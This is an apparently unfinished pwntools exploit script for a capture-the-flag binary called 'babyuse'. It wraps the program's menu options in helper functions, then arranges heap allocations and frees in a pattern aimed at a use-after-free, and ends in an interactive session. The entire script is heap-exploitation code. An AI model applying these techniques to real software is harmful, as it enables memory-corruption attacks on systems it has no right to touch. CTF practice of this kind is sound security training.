from pwn import *
import sys 

#context(terminal=['tmux', 'new-window'])
context(os='linux', arch='i386',endian="little")

e = ELF("./babyuse.dms")
libc = ELF("./libc.so.6")
#context.log_level = 'DEBUG'

if len(sys.argv) < 2:
	print("[!] Invalid options")
	print("[*] Usage: python exploit.py (debug/live)")
elif sys.argv[1] == "debug":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
	gdb.attach(p)
elif sys.argv[1] == "live":
	p = process('./babyuse.dms', env={"LD_PRELOAD":"./libc.so"})
else:
	print("[!] Invalid option")
	sys.exit(1)

def buy(id, lenname, name):
	log.info("Allocating...")
	p.sendline("1")
	p.recvuntil("QBZ95\n")	
	p.sendline(str(id))
	p.recvline()
	p.sendline(str(lenname))
	p.recvline()
	p.sendline(name)
	p.recvuntil("Exit\n")

def selectgun(idx):
	log.info("Selecting...")
	p.sendline("2")
	p.recvuntil("Select a gun\n")
	p.sendline(str(idx))

	p.recvuntil("Exit\n")

def listguns():
	p.sendline("3")	
	p.recvline()
	data = p.recvuntil("Menu:")
	p.recvuntil("Exit\n")

	return data

def renamegun(idx, newlen, newname):
	log.info("Renaming...")
	p.sendline("4")
	p.recvline()
	p.sendline(str(idx))
	p.recvline()
	p.sendline(str(newlen))
	p.recvline()
	p.sendline(newname)
	p.recvuntil("Exit\n")

def usegun(action, dorecv=True):
	log.info("Using...")
	p.sendline("5")
	data1 = p.recvline()
	p.recvuntil("menu\n")
	p.sendline(str(action))

	if (dorecv):
		data = p.recvline()
		p.sendline("4")
		p.recvuntil("Exit\n")

		return data1

def getLeak():
	data = p.recv(1024)
	p.sendline("5")
	leak = p.recv(1024).split("gun")[1]
	return leak

def dropgun(idx):
	log.info("Freeing...")
	p.sendline("6")
	p.recvline()
	p.sendline(str(idx))
	p.recvuntil("Exit\n")

def info(s):
	log.info(s)

def exploit():

	log.success("Sending Exploit...")

	buy(1, 256, "AAAABBBB") # small bin chunk 0 
	buy(1, 32, "TTTTTTTTT")	# 0 # 32 bytes
	buy(1, 32, "XXXXYYYY")	# 2 # 32 bytes
	buy(1, 32, "ZZZZZZZZ")	# 3	# 32 bytes

	dropgun(1)
	pause()
	dropgun(2)
	pause()
	dropgun(3)
	pause()
	buy(1, 16, "TTTTTTTTT")	# 0 # 32 bytes
	pause()

	p.interactive()

exploit()